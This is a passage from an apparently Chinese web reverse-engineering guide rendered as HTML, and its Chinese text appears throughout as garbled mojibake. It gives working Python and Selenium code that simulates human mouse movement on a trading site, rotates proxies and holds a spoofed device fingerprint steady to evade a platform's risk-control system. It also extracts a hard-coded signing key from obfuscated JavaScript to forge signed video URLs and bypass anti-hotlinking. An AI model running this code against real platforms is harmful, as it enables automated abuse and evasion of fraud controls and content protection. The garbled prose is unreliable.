            <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="nb">min</span><span class="p">(</span><span class="n">start</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">end</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span> <span class="nb">max</span><span class="p">(</span><span class="n">start</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">end</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
        <span class="p">))</span>
    <span class="n">points</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">end</span><span class="p">)</span>

    <span class="c1"># è´å¡å°”æ›²çº¿æ’å€¼</span>
    <span class="n">path</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">np</span><span class="o">.</span><span class="n">linspace</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">50</span><span class="p">):</span>
        <span class="n">x</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">([(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span><span class="o">**</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">points</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="n">t</span><span class="o">**</span><span class="n">i</span> <span class="o">*</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">np</span><span class="o">.</span><span class="n">math</span><span class="o">.</span><span class="n">comb</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">points</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
                <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">points</span><span class="p">)])</span>
        <span class="n">y</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">([(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span><span class="o">**</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">points</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="n">t</span><span class="o">**</span><span class="n">i</span> <span class="o">*</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="n">np</span><span class="o">.</span><span class="n">math</span><span class="o">.</span><span class="n">comb</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">points</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
                <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">points</span><span class="p">)])</span>
        <span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">y</span><span class="p">)))</span>

    <span class="k">return</span> <span class="n">path</span>

<span class="k">def</span><span class="w"> </span><span class="nf">human_like_click</span><span class="p">(</span><span class="n">driver</span><span class="p">,</span> <span class="n">element</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æ¨¡æ‹ŸçœŸäººç‚¹å‡»&quot;&quot;&quot;</span>
    <span class="c1"># 1. ç§»åŠ¨åˆ°å…ƒç´ é™„è¿‘</span>
    <span class="n">location</span> <span class="o">=</span> <span class="n">element</span><span class="o">.</span><span class="n">location</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">element</span><span class="o">.</span><span class="n">size</span>

    <span class="c1"># éšæœºåç§»</span>
    <span class="n">target_x</span> <span class="o">=</span> <span class="n">location</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">size</span><span class="p">[</span><span class="s1">&#39;width&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span>
    <span class="n">target_y</span> <span class="o">=</span> <span class="n">location</span><span class="p">[</span><span class="s1">&#39;y&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">size</span><span class="p">[</span><span class="s1">&#39;height&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span>

    <span class="c1"># ç”Ÿæˆæ›²çº¿è·¯å¾„</span>
    <span class="n">current_pos</span> <span class="o">=</span> <span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">800</span><span class="p">),</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">600</span><span class="p">))</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">generate_bezier_curve</span><span class="p">(</span><span class="n">current_pos</span><span class="p">,</span> <span class="p">(</span><span class="n">target_x</span><span class="p">,</span> <span class="n">target_y</span><span class="p">))</span>

    <span class="c1"># 2. æ²¿æ›²çº¿ç§»åŠ¨</span>
    <span class="n">actions</span> <span class="o">=</span> <span class="n">ActionChains</span><span class="p">(</span><span class="n">driver</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>
        <span class="n">actions</span><span class="o">.</span><span class="n">move_by_offset</span><span class="p">(</span><span class="n">x</span> <span class="o">-</span> <span class="n">current_pos</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">y</span> <span class="o">-</span> <span class="n">current_pos</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
        <span class="n">actions</span><span class="o">.</span><span class="n">pause</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.001</span><span class="p">,</span> <span class="mf">0.005</span><span class="p">))</span>  <span class="c1"># éšæœºå»¶è¿Ÿ</span>
        <span class="n">current_pos</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>

    <span class="c1"># 3. ç‚¹å‡»å‰åœé¡¿</span>
    <span class="n">actions</span><span class="o">.</span><span class="n">pause</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.1</span><span class="p">,</span> <span class="mf">0.3</span><span class="p">))</span>

    <span class="c1"># 4. ç‚¹å‡»</span>
    <span class="n">actions</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>
    <span class="n">actions</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>

    <span class="c1"># 5. ç‚¹å‡»ååœé¡¿</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.5</span><span class="p">,</span> <span class="mf">1.5</span><span class="p">))</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://stock.example.com/trade&#39;</span><span class="p">)</span>

<span class="n">buy_button</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s1">&#39;buy-button&#39;</span><span class="p">)</span>
<span class="n">human_like_click</span><span class="p">(</span><span class="n">driver</span><span class="p">,</span> <span class="n">buy_button</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹äº”å®æ—¶é£æ§ç³»ç»Ÿç»•è¿‡">æ¡ˆä¾‹äº”ï¼šå®æ—¶é£æ§ç³»ç»Ÿç»•è¿‡</h2>

      <h3 id="èƒŒæ™¯-5">èƒŒæ™¯</h3>

      <p>å¹³å°æœ‰å®æ—¶é£æ§ç³»ç»Ÿï¼Œç›‘æ§å¼‚å¸¸è¡Œä¸ºï¼š</p>

      <ul>
        <li>åŒä¸€ IP çŸ­æ—¶é—´å¤šæ¬¡ç™»å½•</li>
        <li>å¼‚å¸¸äº¤æ˜“æ¨¡å¼</li>
        <li>è®¾å¤‡æŒ‡çº¹å˜åŒ–</li>
        <li>åœ°ç†ä½ç½®è·³å˜</li>
      </ul>

      <hr />

      <h3 id="ç»•è¿‡ç­–ç•¥">ç»•è¿‡ç­–ç•¥</h3>

      <h4 id="1-ä½¿ç”¨ä»£ç†æ± ">1. ä½¿ç”¨ä»£ç†æ± </h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">itertools</span><span class="w"> </span><span class="kn">import</span> <span class="n">cycle</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ProxyRotator</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy_list</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">proxy_pool</span> <span class="o">=</span> <span class="n">cycle</span><span class="p">(</span><span class="n">proxy_list</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_session</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">proxy</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">proxy_pool</span><span class="p">)</span>
        <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="n">session</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">,</span>
            <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="n">proxy</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">session</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">&#39;http://proxy1.com:8080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;http://proxy2.com:8080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;http://proxy3.com:8080&#39;</span>
<span class="p">]</span>

<span class="n">rotator</span> <span class="o">=</span> <span class="n">ProxyRotator</span><span class="p">(</span><span class="n">proxies</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
    <span class="n">session</span> <span class="o">=</span> <span class="n">rotator</span><span class="o">.</span><span class="n">get_session</span><span class="p">()</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://stock.example.com/api/market-data&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Request </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>  <span class="c1"># éšæœºå»¶è¿Ÿ</span>
</code></pre>
      </div>

      <h4 id="2-ä¿æŒè®¾å¤‡æŒ‡çº¹ä¸€è‡´æ€§">2. ä¿æŒè®¾å¤‡æŒ‡çº¹ä¸€è‡´æ€§</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">ConsistentBrowser</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">user_agent</span> <span class="o">=</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64)...&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">user_agent</span><span class="p">,</span>
            <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.9&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate, br&#39;</span><span class="p">,</span>
        <span class="p">}</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">device_id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">generate_device_id</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">generate_device_id</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># ç”Ÿæˆä¸€æ¬¡åä¿æŒä¸å˜</span>
        <span class="n">fingerprint</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;userAgent&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">user_agent</span><span class="p">,</span>
            <span class="s1">&#39;screen&#39;</span><span class="p">:</span> <span class="s1">&#39;1920x1080&#39;</span><span class="p">,</span>
            <span class="s1">&#39;timezone&#39;</span><span class="p">:</span> <span class="o">-</span><span class="mi">480</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">fingerprint</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span>
        <span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-Device-Id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">device_id</span>

        <span class="k">return</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®‰å…¨å»ºè®®">å®‰å…¨å»ºè®®</h2>

      <h3 id="å¯¹äºé‡‘èå¹³å°">å¯¹äºé‡‘èå¹³å°</h3>

      <ol>
        <li>
          <p><strong>å¤šå±‚åŠ å¯†</strong></p>

          <ul>
            <li>ä¼ è¾“å±‚: TLS 1.3</li>
            <li>åº”ç”¨å±‚: RSA + AES</li>
            <li>æ•°æ®åº“: å­—æ®µçº§åŠ å¯†</li>
          </ul>
        </li>
        <li>
          <p><strong>åŠ¨æ€é˜²æŠ¤</strong></p>

          <ul>
            <li>æ¯æ¬¡ç™»å½•æ›´æ–°å…¬é’¥</li>
            <li>Token çŸ­æœŸæœ‰æ•ˆï¼ˆ15åˆ†é’Ÿï¼‰</li>
            <li>ç­¾åç›å€¼å®šæœŸè½®æ¢</li>
          </ul>
        </li>
        <li>
          <p><strong>è¡Œä¸ºåˆ†æ</strong></p>

          <ul>
            <li>æœºå™¨å­¦ä¹ æ£€æµ‹å¼‚å¸¸</li>
            <li>å¤šç»´åº¦æŒ‡çº¹è¯†åˆ«</li>
            <li>å®æ—¶é£æ§è§„åˆ™å¼•æ“</li>
          </ul>
        </li>
        <li>
          <p><strong>å®¡è®¡æ—¥å¿—</strong></p>

          <ul>
            <li>è®°å½•æ‰€æœ‰æ•æ„Ÿæ“ä½œ</li>
            <li>å¼‚å¸¸å‘Šè­¦</li>
            <li>å¯è¿½æº¯æ€§</li>
          </ul>
        </li>
      </ol>

      <h3 id="å¯¹äºç ”ç©¶äººå‘˜">å¯¹äºç ”ç©¶äººå‘˜</h3>

      <ol>
        <li>
          <p><strong>åˆæ³•åˆè§„</strong></p>

          <ul>
            <li>ä»…åœ¨æˆæƒèŒƒå›´å†…ç ”ç©¶</li>
            <li>ä¸è¿›è¡Œå®é™…äº¤æ˜“æµ‹è¯•</li>
            <li>è´Ÿè´£ä»»æŠ«éœ²æ¼æ´</li>
          </ul>
        </li>
        <li>
          <p><strong>æµ‹è¯•ç¯å¢ƒ</strong></p>

          <ul>
            <li>ä½¿ç”¨æ¼”ç¤ºè´¦æˆ·</li>
            <li>æ²™ç®±ç¯å¢ƒ</li>
            <li>ä¸æ¶‰åŠçœŸå®èµ„é‡‘</li>
          </ul>
        </li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="../02-Techniques/crypto_reverse_engineering.md">åŠ å¯†ç®—æ³•é€†å‘</a></li>
        <li><a href="../03-Advanced-Topics/device_fingerprinting.md">è®¾å¤‡æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="../02-Techniques/websocket_analysis.md">WebSocket é€šä¿¡åˆ†æ</a></li>
        <li><a href="../02-Techniques/behavior_detection_bypass.md">è¡Œä¸ºæ£€æµ‹ç»•è¿‡</a></li>
      </ul>

    </div>

    <div class="section" id="05-Case-Studies-case-video-streaming">
      <h2>48. Video Streaming</h2>
      <h1 id="è§†é¢‘ç½‘ç«™é€†å‘">è§†é¢‘ç½‘ç«™é€†å‘</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>è§†é¢‘ç½‘ç«™æ˜¯æœ€å…·æŒ‘æˆ˜æ€§çš„é€†å‘å·¥ç¨‹ç›®æ ‡ä¹‹ä¸€ã€‚æœ¬æ–‡é€šè¿‡ 5 ä¸ªçœŸå®æ¡ˆä¾‹ï¼Œæ·±å…¥è®²è§£è§†é¢‘å¹³å°çš„æ ¸å¿ƒé˜²æŠ¤æœºåˆ¶åŠå…¶é€†å‘æ–¹æ³•ã€‚</p>

      <hr />

      <h2 id="æ¡ˆä¾‹-1-è§†é¢‘-url-è§£å¯†ä¸é˜²ç›—é“¾ç»•è¿‡">æ¡ˆä¾‹ 1: è§†é¢‘ URL è§£å¯†ä¸é˜²ç›—é“¾ç»•è¿‡</h2>

      <h3 id="èƒŒæ™¯">èƒŒæ™¯</h3>

      <p>æŸè§†é¢‘å¹³å°ä½¿ç”¨åŠ å¯† URL å’Œæ—¶é—´æˆ³ç­¾åæ¥é˜²æ­¢è§†é¢‘ç›—é“¾ã€‚è§†é¢‘æ’­æ”¾æ—¶ï¼Œå®¢æˆ·ç«¯éœ€è¦åŠ¨æ€ç”Ÿæˆå¸¦ç­¾åçš„æ’­æ”¾åœ°å€ã€‚</p>

      <h3 id="é€†å‘æ­¥éª¤">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-æŠ“åŒ…åˆ†æ">1. æŠ“åŒ…åˆ†æ</h4>

      <p><strong>ç½‘ç»œè¯·æ±‚</strong>:</p>

      <pre><code>GET /video/play?vid=abc123&amp;t=1702800000&amp;sign=e3b0c44298fc
Host: video.example.com
Referer: https://video.example.com/watch/abc123
</code></pre>

      <p><strong>å“åº”</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;code&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;url&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://cdn.example.com/stream/abc123.m3u8?token=xxx&amp;expires=1702803600&quot;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-javascript-åˆ†æ">2. JavaScript åˆ†æ</h4>

      <p>åœ¨ <code>player.js</code> ä¸­æ‰¾åˆ°ç­¾åç”Ÿæˆé€»è¾‘:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">generateSign</span><span class="p">(</span><span class="nx">vid</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;secret_key_2024&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">vid</span><span class="si">}</span><span class="sb">|</span><span class="si">${</span><span class="nx">timestamp</span><span class="si">}</span><span class="sb">|</span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">str</span><span class="p">).</span><span class="nx">substr</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">12</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">getPlayUrl</span><span class="p">(</span><span class="nx">vid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">sign</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generateSign</span><span class="p">(</span><span class="nx">vid</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="sb">`/video/play?vid=</span><span class="si">${</span><span class="nx">vid</span><span class="si">}</span><span class="sb">&amp;t=</span><span class="si">${</span><span class="nx">timestamp</span><span class="si">}</span><span class="sb">&amp;sign=</span><span class="si">${</span><span class="nx">sign</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="s1">&#39;Referer&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;https://video.example.com/watch/&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">vid</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="3-å¯†é’¥æå–">3. å¯†é’¥æå–</h4>

      <p>é€šè¿‡æœç´¢ <code>secret_key</code> å…³é”®è¯ï¼Œåœ¨æ··æ·†ä»£ç ä¸­å®šä½:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ··æ·†å</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">_0x1a2b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;_&#39;</span><span class="p">,</span><span class="s1">&#39;k&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;y&#39;</span><span class="p">,</span><span class="s1">&#39;_&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">,</span><span class="s1">&#39;4&#39;</span><span class="p">];</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_0x1a2b</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="python-å®ç°">Python å®ç°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="k">class</span><span class="w"> </span><span class="nc">VideoDownloader</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&quot;https://video.example.com&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s2">&quot;secret_key_2024&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">generate_sign</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">vid</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆè§†é¢‘ç­¾å&quot;&quot;&quot;</span>
        <span class="n">str_to_sign</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">vid</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">secret_key</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">str_to_sign</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">12</span><span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_play_url</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">vid</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–æ’­æ”¾åœ°å€&quot;&quot;&quot;</span>
        <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
        <span class="n">sign</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">generate_sign</span><span class="p">(</span><span class="n">vid</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">)</span>

        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/video/play&quot;</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;vid&#39;</span><span class="p">:</span> <span class="n">vid</span><span class="p">,</span>
            <span class="s1">&#39;t&#39;</span><span class="p">:</span> <span class="n">timestamp</span><span class="p">,</span>
            <span class="s1">&#39;sign&#39;</span><span class="p">:</span> <span class="n">sign</span>
        <span class="p">}</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/watch/</span><span class="si">{</span><span class="n">vid</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
            <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span>
        <span class="p">}</span>

        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

        <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
